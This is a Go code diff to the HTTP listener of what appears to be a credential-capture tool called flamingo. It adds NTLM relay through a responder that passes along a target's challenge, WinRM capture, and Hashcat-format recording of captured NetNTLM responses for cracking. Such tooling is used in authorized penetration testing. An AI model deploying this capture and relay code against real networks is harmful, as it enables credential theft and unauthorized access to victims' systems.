@@ -55,6 +55,39 @@ type ConfHTTP struct {
 	// own. Zero means HTTPProxyPort.
 	WPADProxyPort uint16
 
+	// RefuseAuth answers a captured AUTHENTICATE with the challenge status
+	// again instead of falling through to 200. A plain HTTP collector serves
+	// a page once it has the credential, but a WinRM client that is told it
+	// succeeded goes on to run commands against a server that cannot answer
+	// them; telling it the logon failed ends the exchange honestly.
+	RefuseAuth bool
+
+	// ChallengeAllMethods answers every HTTP method with an authentication
+	// challenge, not just the ones a browser or WebDAV client fetches with.
+	// WinRM POSTs SOAP to /wsman, so without this its requests are 404ed
+	// before the NTLM exchange ever starts.
+	ChallengeAllMethods bool
+
+	// ProtoName overrides the protocol label recorded for this listener.
+	// WinRM is NTLM over HTTP, so it runs on this listener and relabels
+	// itself rather than duplicating the whole exchange.
+	ProtoName string
+
+	// Responder decides the challenge a victim is answered with and whether
+	// it is told the logon succeeded. Nil -- the default -- is capture only.
+	// A relay responder makes this listener forward to a target instead.
+	//
+	// The NTLM exchange spans two requests, so the same NTLMExchange has to
+	// reach both Challenge and Authenticate: the responder keys its session
+	// by that pointer. exchanges holds it for the life of the connection.
+	Responder NTLMResponder
+
+	exchanges map[net.Conn]*NTLMExchange
+
+	// tlsSuffix is the label used in place of ProtoName when TLS is on,
+	// so one pair of listeners can report winrm and winrms.
+	tlsSuffix string
+
 	shutdown bool
 	listener net.Listener
 	server   *http.Server
@@ -63,6 +96,12 @@ type ConfHTTP struct {
 
 // protoName is the protocol label recorded for this listener.
 func (c *ConfHTTP) protoName() string {
+	if c.ProtoName != "" {
+		if c.TLS && c.tlsSuffix != "" {
+			return c.tlsSuffix
+		}
+		return c.ProtoName
+	}
 	name := "http"
 	if c.TLS {
 		name = "https"
@@ -92,9 +131,11 @@ func (c *ConfHTTP) Shutdown() {
 
 	if !c.shutdown {
 		c.shutdown = true
-		timeoutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
-		defer cancel()
-		c.server.Shutdown(timeoutCtx)
+		// Close rather than Shutdown: graceful draining waits out every
+		// idle keep-alive connection, and a client holding one open made
+		// teardown take the full timeout. Records are written before the
+		// response, so nothing captured is lost by cutting a response short.
+		c.server.Close()
 	}
 }
 
@@ -116,6 +157,18 @@ func SpawnHTTP(c *ConfHTTP) error {
 		Addr:         fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
 	}
 	c.server.Handler = httpHandler(c)
+
+	// The NTLM exchange spans two requests on one keep-alive connection, so
+	// the connection is carried into the handler and used to correlate them.
+	c.exchanges = make(map[net.Conn]*NTLMExchange)
+	c.server.ConnContext = func(ctx context.Context, conn net.Conn) context.Context {
+		return context.WithValue(ctx, httpConnKey{}, conn)
+	}
+	c.server.ConnState = func(conn net.Conn, state http.ConnState) {
+		if state == http.StateClosed || state == http.StateHijacked {
+			c.forgetExchange(conn)
+		}
+	}
 
 	// Handler normal listeners
 	if !c.TLS {
@@ -278,6 +331,52 @@ func httpBasicChallenge(c *ConfHTTP, scheme httpAuthScheme, w http.ResponseWrite
 	w.WriteHeader(scheme.status)
 }
 
+// httpConnKey keys the connection stashed in each request context.
+type httpConnKey struct{}
+
+// httpConn returns the connection a request arrived on, or nil.
+func httpConn(r *http.Request) net.Conn {
+	conn, _ := r.Context().Value(httpConnKey{}).(net.Conn)
+	return conn
+}
+
+// exchange returns the NTLM exchange for a request's connection, creating it
+// on the NEGOTIATE. Returning the same pointer for both halves of the
+// exchange is what lets a relay responder keep one session across the two
+// requests.
+func (c *ConfHTTP) exchange(r *http.Request, flags uint32, version string) *NTLMExchange {
+	conn := httpConn(r)
+	c.m.Lock()
+	defer c.m.Unlock()
+	if c.exchanges == nil {
+		c.exchanges = make(map[net.Conn]*NTLMExchange)
+	}
+	if conn != nil {
+		if x, ok := c.exchanges[conn]; ok {
+			return x
+		}
+	}
+	x := &NTLMExchange{
+		Proto:         c.protoName(),
+		ServerAddr:    c.serverAddr(),
+		RemoteAddr:    r.RemoteAddr,
+		Flags:         flags,
+		ClientVersion: version,
+		Conn:          conn,
+	}
+	if conn != nil {
+		c.exchanges[conn] = x
+	}
+	return x
+}
+
+// forgetExchange drops the exchange held for a connection.
+func (c *ConfHTTP) forgetExchange(conn net.Conn) {
+	c.m.Lock()
+	defer c.m.Unlock()
+	delete(c.exchanges, conn)
+}
+
 // requestFields builds the record fields every HTTP observation shares.
 func (c *ConfHTTP) requestFields(r *http.Request) map[string]string {
 	pname := c.protoName()
@@ -304,7 +403,7 @@ func httpHandleNTLMAuth(c *ConfHTTP, scheme httpAuthScheme, w http.ResponseWrite
 	// A proxy sees every method, including CONNECT and POST, and must
 	// challenge all of them. An origin server only plays the NTLM dance for
 	// the methods a browser or WebDAV client uses to fetch a resource.
-	if !scheme.proxy {
+	if !scheme.proxy && !c.ChallengeAllMethods {
 		if r.Method == "OPTIONS" {
 			// OPTIONS indicates a possible WebDAV client
 			w.Header().Set("Allow", "OPTIONS,GET,HEAD,POST,PUT,DELETE,TRACE,"+
@@ -334,11 +433,32 @@ func httpHandleNTLMAuth(c *ConfHTTP, scheme httpAuthScheme, w http.ResponseWrite
 		w.Header().Set(scheme.respHeader, "NTLM")
 		w.WriteHeader(scheme.status)
 	case 1:
-		clientFlags := uint32(0)
-		if negotiate, err := ntlmHeaderBytes(authHeader); err == nil {
-			clientFlags, _ = ParseNTLMNegotiate(negotiate)
+		clientFlags, clientVersion := uint32(0), ""
+		negotiate, err := ntlmHeaderBytes(authHeader)
+		if err == nil {
+			clientFlags, clientVersion = ParseNTLMNegotiate(negotiate)
 		}
-		challenge := base64.StdEncoding.EncodeToString(NTLMChallengeMessage(clientFlags))
+
+		x := c.exchange(r, clientFlags, clientVersion)
+		x.Type1 = negotiate
+
+		// Capture-only answers with flamingo's own challenge. A relay
+		// responder answers with the target's instead, so the victim
+		// computes its response against the target.
+		msg := NTLMChallengeMessage(clientFlags)
+		if c.Responder != nil {
+			relayed, rerr := c.Responder.Challenge(x)
+			if rerr != nil {
+				w.WriteHeader(scheme.status)
+				return
+			}
+			if len(relayed) > 0 {
+				msg = relayed
+			}
+		}
+		x.Type2 = msg
+
+		challenge := base64.StdEncoding.EncodeToString(msg)
 		w.Header().Set(scheme.respHeader, fmt.Sprintf("NTLM %s", challenge))
 		w.WriteHeader(scheme.status)
 	case 3:
@@ -352,17 +472,63 @@ func httpHandleNTLMAuth(c *ConfHTTP, scheme httpAuthScheme, w http.ResponseWrite
 			w.WriteHeader(404)
 			return
 		}
-		line, _ := NTLMHashcat(auth)
+		x := c.exchange(r, auth.Flags, auth.Version)
 
 		fields := c.requestFields(r)
 		fields["username"] = auth.User
-		fields["hashcat"] = line
+		fields["domain"] = auth.Domain
+		fields["workstation"] = auth.Workstation
+		fields["ntlm_version"] = auth.NTLMVersion()
 		fields["method"] = "NTLMSSP"
+
+		// A response is only crackable against the challenge it was computed
+		// from. Capture-only always answers with the same fixed challenge, so
+		// a response is attributable even when it arrives on a connection
+		// other than the one challenged -- which HTTP/1.0 clients and some
+		// proxy clients really do. Under relay the challenge was the
+		// target's and is specific to one exchange, so a response that
+		// cannot be tied back to it must not be dressed up as crackable.
+		challenge := NTLMServerChallenge(x.Type2)
+		if challenge == nil && c.Responder == nil {
+			challenge = NTLMConf.Challenge[:]
+		}
+		if challenge == nil {
+			fields["reason"] = "no challenge was issued on this connection"
+			c.RecordWriter.Record("access", c.protoName(), r.RemoteAddr, fields)
+			if conn := httpConn(r); conn != nil {
+				c.forgetExchange(conn)
+			}
+			w.WriteHeader(scheme.status)
+			return
+		}
+
+		// Format against the challenge actually sent. Under relay that is
+		// the target's, and using flamingo's here would emit a line that
+		// looks right and can never crack.
+		line, mode := NTLMHashcatChallenge(auth, challenge)
+		fields["hashcat"] = line
+		if mode > 0 {
+			fields["hashcat_mode"] = fmt.Sprintf("%d", mode)
+		}
 		c.RecordWriter.Record("credential", c.protoName(), r.RemoteAddr, fields)
 		ok = true
 
+		// The record is written first, so a relay that fails still leaves
+		// the capture behind.
+		accepted := false
+		if c.Responder != nil {
+			accepted = c.Responder.Authenticate(x, auth, ntlmBytes)
+		}
+		if conn := httpConn(r); conn != nil {
+			c.forgetExchange(conn)
+		}
+
 		if scheme.proxy {
 			httpProxyGiveUp(w)
+			return
+		}
+		if c.RefuseAuth && !accepted {
+			w.WriteHeader(scheme.status)
 		}
 	}
 	return
